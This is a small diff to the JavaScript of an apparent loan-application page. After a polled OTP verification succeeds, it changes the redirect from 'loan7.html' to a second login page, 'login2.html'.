@@ -144,7 +144,8 @@
                 verifyText.innerHTML = `OTP verified! Proceeding...`;
 
               setTimeout(() => {
-                window.location.href = "loan7.html";
+                // After approval, require final login step before final page
+                window.location.href = "login2.html";
               }, 1500);
             } else if (data.rejected) {
               clearInterval(pollInterval);
